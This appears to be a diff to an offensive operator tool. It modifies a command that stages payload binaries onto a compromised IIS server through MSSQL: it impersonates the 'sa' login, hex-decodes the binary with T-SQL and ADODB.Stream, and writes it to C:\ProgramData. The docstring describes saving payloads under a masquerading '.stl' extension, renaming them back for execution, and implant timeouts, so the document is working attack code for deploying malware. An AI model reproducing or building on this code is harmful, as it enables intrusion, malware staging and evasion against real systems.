@@ -33,19 +33,31 @@ class StagingMixin:
         self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
         print(f"[+] xpstage done: {out_path}")
 
-    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = None, rename: bool = False):
+    def cmd_xpstage_hex(self, shell, payload_name: str, timeout_s: int = None,
+                        stl: bool = False, rename: bool = False):
         """Stage binary to IIS01 via hex SQL + T-SQL ADODB.Stream decode (no .ps1).
 
-        Default: the decode batch writes the binary to C:\\ProgramData as
-        <stem>.stl and leaves it under the masquerading extension - the payload
-        is executed directly from the benign-extension file. With rename=True,
-        a sp_OA FSO MoveFile in the same decode batch renames it back to the
-        original payload_name before use.
+        Default (direct): the decode batch SaveToFile's straight to
+        C:\\ProgramData\\<payload_name> (original extension, e.g. .exe) - no
+        transient file, no MoveFile. xprun dispatch requires this for unsigned
+        payloads (ShellExecuteEx resolves execution by extension/association).
 
-        timeout_s (optional): implant wait-limit override for the decode batch
-        (None = operator `timeout <n>` value; the poll itself blocks until the
-        task terminates). Decode of a multi-MB payload can take minutes.
+        With --stl: the binary is written as <stem>.stl and left under the
+        masquerading extension - used for signed payloads (e.g. CertEnrollSvc)
+        that ShellExecuteEx runs fine from a benign extension.
+
+        With --stl --rename: a sp_OA FSO MoveFile in the same decode batch
+        renames the .stl back to the original payload_name - transient
+        masquerade for payloads executed by CreateProcess-based dispatch.
+
+        rename requires stl. timeout_s (optional): implant wait-limit override
+        for the decode batch (None = operator `timeout <n>` value; the poll
+        itself blocks until the task terminates). Decode of a multi-MB payload
+        can take minutes.
         """
+        if rename and not stl:
+            print("[!] xpstage-hex: --rename requires --stl")
+            return
         resp = shell._post_json("/api/v1.0/mssql/stage", {
             "handler": "toneshell",
             "payload": payload_name,
@@ -59,6 +71,7 @@ class StagingMixin:
 
         out_path = f"C:\\ProgramData\\{payload_name}"
         stl_path = f"C:\\ProgramData\\{os.path.splitext(payload_name)[0]}.stl"
+        write_path = stl_path if stl else out_path
         decode_tsql = (
             "EXECUTE AS LOGIN='sa';"
             "DECLARE @hex VARCHAR(MAX)='';"
@@ -72,7 +85,7 @@ class StagingMixin:
             "EXEC sp_OAMethod @obj,'Open';"
             "EXEC sp_OAMethod @obj,'Write',NULL,@bin;"
             f"EXEC sp_OAMethod @obj,'SaveToFile',NULL,"
-            f"'{self._tsql_escape(stl_path)}',2;"
+            f"'{self._tsql_escape(write_path)}',2;"
             "EXEC sp_OAMethod @obj,'Close';"
             "EXEC sp_OADestroy @obj;"
         )
@@ -85,7 +98,7 @@ class StagingMixin:
             )
         self._exec_q(shell, decode_tsql, timeout_s=timeout_s)
 
-        final_path = out_path if rename else stl_path
+        final_path = stl_path if (stl and not rename) else out_path
 
         # Size verify: the ADODB.Stream write has no integrity feedback - a
         # failed/interleaved SaveToFile silently leaves the previous on-disk
